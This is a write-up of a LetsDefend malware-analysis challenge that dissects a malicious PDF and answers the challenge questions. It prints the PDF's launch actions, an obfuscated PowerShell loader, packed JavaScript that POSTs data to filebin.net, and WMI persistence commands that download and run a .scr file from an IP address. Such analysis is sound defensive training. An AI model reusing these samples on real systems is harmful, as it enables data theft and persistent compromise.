# PDF Analysis - LetsDefend Challenge

### Summary

An employee has received a suspicious email:

**From:** SystemsUpdate@letsdefend.io **To:** Paul@letsdefend.io **Subject:** Critical - Annual Systems UPDATE NOW **Body:** Please do the dutiful before the deadline today. **Attachment:** [Update.pdf](https://drive.google.com/file/d/1_P5rsU1LCHYW--36TbhYqA841VeAZ6VE/view?usp=sharing) **Password:** letsdefend

The employee has reported this incident to you as the analyst which has also forwarded the attachment to your SIEM. They have mentioned that they did not download or open the attachment as they found it very suspicious. They wish for you to analyze it further to verify its legitimacy.

**File link:** [Download](https://drive.google.com/file/d/1_P5rsU1LCHYW--36TbhYqA841VeAZ6VE/view?usp=sharing) **Password:** letsdefend

NOTE: Do not open in your local environment. It is a malicious file.

This challenge prepared by [@DXploiter](https://twitter.com/DXploiter)

### Questions

1. What local directory name would have been targeted by the malware?
2. What would have been the name of the file created by the payload?
3. What file type would this have been if it were created?
4. Which external web domain would the malware have attempted to interact with?
5. Which HTTP method would it have used to interact with this service?
6. What is the name of the obfuscation used for the Javascript payload?
7. Which tool would have been used for creating the persistence mechanism?
8. How often would the persistence be executed once Windows starts? (format: X.X hours)?
9. Which LOLBin would have been used in the persistence method?
10. What is the filename that would have been downloaded and executed using the LOLbin?
11. Where would this have been downloaded from? (format: IP address)
12. Which country is this IP Address located in?

### Findings

1. Download the infected file in our isolated environment.
2. Upload to [VirusTotal.com](http://VirusTotal.com) and check the malware validity. Trojan is flagged on the virus scan. [VirusTotal](https://www.virustotal.com/gui/file/ac3d6089d459195800931784a175b31fd65e20a937488acd95477db7dd253280/detection)
3. Let's check on what is the content inside this malicious PDF file by using `strings` command
    
    `strings Update.pdf`
    
4. After reviewing to the pdf file, I saw there is a PowerShell command which is encoded in Base64.
    
    ```powershell
    endobj
    19 0 obj
        /OpenAction
          <<
            /S /Launch
            /Win
              <<
                /F '(\\powershell -EncodedCommand cDF6c2MwRCV3cW53bm5qZWt3aW56JXN0bmVtdWNvRCU6QyBodGFQbm9pdGFuaXRzZUQtIGV0YWRwVS0gKiVzdG5lbXVjb0QlOkMgaHRhUC0gZXZpaGNyQS1zc2VycG1vQw==)'
           >>
     endobj
    ```
    
5. Let’s decode it using CyberChef with “From Base64”. The outcome looks weird, and it looks like reversed and what I found on the next code, it open with the cmd.exe and decode with ‘best64code’ and do the ‘Reverse’ function on the ‘$base64’ variable, which means the outcome after decoding should require to reverse. 
    
    ```powershell
    26 0 obj
            /OpenAction <<
                            /S /Launch
                            /Win
                        <<
    			/F (\103:\\Windows\\system32\\cmd.exe /C 'Powershell')
                            /P ($best64code = ("{5}{0}{2}{30}{12}{1}{14}{15}{6}{21}{31}{20}{10}{28}{7}{24}{11}{13}{22}{25}{17}{3}{19}{8}{4}{23}{26}{9}{16}{18}{27}{29}"-f 'mTuIXZ0xWaGRnblZXRf9lI9','atdnCNoQDiI3Yz','IXZ0xWaGBSRUFURSNEIn5Wak5WaCJXZtV3cu92QvRlclRHbpZ0XfBCSUFEUgIibvlGdwlmcjNnY1NHX092byx','EIlNmbhR3culEdldmchRFIFJVRIdFIwAD','F','=IiIcpGb2dkYaN3VIJlIc1TZtFmTuIXZtV3cu92Q05WZ2VUZulGTk5WYt12bDJSPyVWb1NnbvNEIsIiIcN2ZJV1alFlZHVmIc1TZtF','h2YhNUZslmRlNWamZ2TcBjL2EDXlNWamZ2TcRnZvN3byNWaNxFbhN2bMxVY0FGRwBXQcVSRMlkRPJFUSV0UVVCXzJXZzVFX6MkI9UGdhx','vJHXlNWamZ2TgQnZvN3byNWa','Zv1UZj5WY0NnbJ91Xg00TSZEIqACVDVET','dn5WYMl','Wb','LioGb2dkYaN3VIJlI9UWbh5EIFRVQFJ1QgIXZtV3cu92Q05WZ2','gMW','VUZulGTk5WYt12bDBCSUFEUgIibvlGdwlmcjNnY1NHX092byxFXioTRDFEUTVUTB50','5iM4Qjc','lBXYwxGbhdHXl','nclVXUsIiM21WajxFdv9mci0TZjFGcTVWbh5EduVmdFBCLiM2ZJV1alFlZHV','UfJzMul2VnASQTl','mI9UWbh5EIFRVQF','M5AiTJhEVJdFI05WZ2VkbvlGdhNWamlG','Rmbh1','GctVGVl5W','LgMWatdnCNoQDicSblR3c5N1XT9kZyVGUfFGdhREZlRHdh1','NlI9knclVXUgwiIMF1Vi0T','Nx1clxWaGBSbhJ3ZvJHUcpzQi0Da0FGUlxmYhRXdjVGeFBC','mcvZkZyVG','ZnFW','J1QgIXZ0xWaGRnblZXRf9F','vNELiAyJyN2cuIDO0IXZwFGcsxWY39CN14CN4EjL3gTMuAjNv8iOwRHdodCIlhXZuQnbwJXZ39GUcZTMlNWamZ2TcR3b','IIRVQQBiIu9Wa0BXayN2ciV3ccR3bvJHXcJiOFNUQQNVRNFkTvAyYp12d','FXioTRDFEUTVUTB50L','aM')
    $base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
    $LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
    Invoke-Expression $LoadCode"")
            /Pages 2 0 R
            /Type /Catalog
    endobj
    ```
    
6. I try again with the “Reverse” option and *gotcha*! It will help you to solve question no 1- 3.
    
    ```powershell
    ##Before Reverse
    p1zsc0D%wqnwnnjekwinz%stnemucoD%:C htaPnoitanitseD- etadpU- *%stnemucoD%:C htaP- evihcrA-sserpmoC
    
    ##After Reverse
    Compress-Archive -Path C:%Documents%* -Update -DestinationPath C:%Documents%zniwkejnnwnqw%D0csz1p
    ```
    
7. Next, let's look into the code further. Where there is another code looks suspicious that using stream functions. Let’s try to de-obfuscate the JavaScript code using beautifier.io.
    
    ```powershell
    33 0 obj
    << /Length 395
    xcdfg >>
    stream
    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 5="v://a.b/c/d";1 0=e f();0.g("h",5);0.j("9-k: 7/m-n","7/p");0.q=r(){s(0.t===4){6.3(0.u);6.3(0.8)}};1 2=\'{"l":"","i":""}\';0.o(2);',32,32,'xhr|var|data|log||url|console|application|responseText|Content|filebin|net|0flqlz0hiz6o4l32|D0csz1p|new|XMLHttpRequest|open|POST|password|setRequestHeader|Type|login|octet|stream|send|json|onreadystatechange|function|if|readyState|status|https'.split('|'),0,{}))
    endstream
    ```
    
    [Online JavaScript beautifier](https://beautifier.io/)
    
8. The outcome of the [beautifier.io](http://beautifier.io). It will help you to solve question no 4 - 6.
    
    ```powershell
    var url = "https://filebin.net/0flqlz0hiz6o4l32/D0csz1p";
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url);
    xhr.setRequestHeader("Content-Type: application/octet-stream", "application/json");
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            console.log(xhr.status);
            console.log(xhr.responseText)
        }
    };
    var data = '{"login":"","password":""}';
    xhr.send(data);
    ```
    
9. For question no 6, the obfuscation used for the JavaScript payload is stated in front of the code. [](https://medium.com/ax1al/javascript-obfuscation-what-why-and-how-5a269e6b6d50)
    
10. For question no 7, ************************************************************************which tool would have been used for creating the persistence mechanism?************************************************************************  On the **steps 5**, we saw there is a function call ‘*$best64code*’ where there is a bunch of the encoded code. I use the [tio.run](http://tio.run) to test on the output of the PowerShell code.
    
    ```powershell
    $best64code = ("{5}{0}{2}{30}{12}{1}{14}{15}{6}{21}{31}{20}{10}{28}{7}{24}{11}{13}{22}{25}{17}{3}{19}{8}{4}{23}{26}{9}{16}{18}{27}{29}"-f 'mTuIXZ0xWaGRnblZXRf9lI9','atdnCNoQDiI3Yz','IXZ0xWaGBSRUFURSNEIn5Wak5WaCJXZtV3cu92QvRlclRHbpZ0XfBCSUFEUgIibvlGdwlmcjNnY1NHX092byx','EIlNmbhR3culEdldmchRFIFJVRIdFIwAD','F','=IiIcpGb2dkYaN3VIJlIc1TZtFmTuIXZtV3cu92Q05WZ2VUZulGTk5WYt12bDJSPyVWb1NnbvNEIsIiIcN2ZJV1alFlZHVmIc1TZtF','h2YhNUZslmRlNWamZ2TcBjL2EDXlNWamZ2TcRnZvN3byNWaNxFbhN2bMxVY0FGRwBXQcVSRMlkRPJFUSV0UVVCXzJXZzVFX6MkI9UGdhx','vJHXlNWamZ2TgQnZvN3byNWa','Zv1UZj5WY0NnbJ91Xg00TSZEIqACVDVET','dn5WYMl','Wb','LioGb2dkYaN3VIJlI9UWbh5EIFRVQFJ1QgIXZtV3cu92Q05WZ2','gMW','VUZulGTk5WYt12bDBCSUFEUgIibvlGdwlmcjNnY1NHX092byxFXioTRDFEUTVUTB50','5iM4Qjc','lBXYwxGbhdHXl','nclVXUsIiM21WajxFdv9mci0TZjFGcTVWbh5EduVmdFBCLiM2ZJV1alFlZHV','UfJzMul2VnASQTl','mI9UWbh5EIFRVQF','M5AiTJhEVJdFI05WZ2VkbvlGdhNWamlG','Rmbh1','GctVGVl5W','LgMWatdnCNoQDicSblR3c5N1XT9kZyVGUfFGdhREZlRHdh1','NlI9knclVXUgwiIMF1Vi0T','Nx1clxWaGBSbhJ3ZvJHUcpzQi0Da0FGUlxmYhRXdjVGeFBC','mcvZkZyVG','ZnFW','J1QgIXZ0xWaGRnblZXRf9F','vNELiAyJyN2cuIDO0IXZwFGcsxWY39CN14CN4EjL3gTMuAjNv8iOwRHdodCIlhXZuQnbwJXZ39GUcZTMlNWamZ2TcR3b','IIRVQQBiIu9Wa0BXayN2ciV3ccR3bvJHXcJiOFNUQQNVRNFkTvAyYp12d','FXioTRDFEUTVUTB50L','aM')
    $base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
    $LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
    Write-Output $LoadCode
    ```
    
11. Output of the code. It will help you to answer question no 7 - 11.
`Query="SELECT * FROM __InstanceModificationEvent WITHIN 9000 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`
The suspicious script should get events from a remote location within 9000 seconds.
`CommandLineEventConsumer CREATE Name="RHWsZbGvlj", ExecutablePath="C:\Program Files\Microsoft Office\root\Office16\Powerpnt.exe 'http://60.187.184.54/wallpaper482.scr' ",CommandLineTemplate="C:\Users\%USERPROFILE%\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\wallpaper482.scr"`
It is creating a process to run a specified executable program from a command line under the LOLBin “***Powerpnt.exe***”, which downloads the file “***wallpaper482.scr***” hosted in the suspicious IP domain ***60.187.184.54***
    
    ```powershell
    wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="eGfQekUIgc", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 9000 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="RHWsZbGvlj", ExecutablePath="C:\Program Files\Microsoft Office\root\Office16\Powerpnt.exe 'http://60.187.184.54/wallpaper482.scr' ",CommandLineTemplate="C:\Users\%USERPROFILE%\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\wallpaper482.scr"
    wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"eGfQekUIgc\"", Consumer="CommandLineEventConsumer.Name=\"RHWsZbGvlj\""
    ```
    
    NOTE: Tricky part to the question no 8, where the PowerShell code is 9000 second but it should be converted to hours. 
    
12. IP address location can use [DNSChecker](http://DNSChecker.com) to find it. [IP Address Lookup - Instantly Locate Your Public IP](https://dnschecker.org/ip-location.php?ip=60.187.184.54)
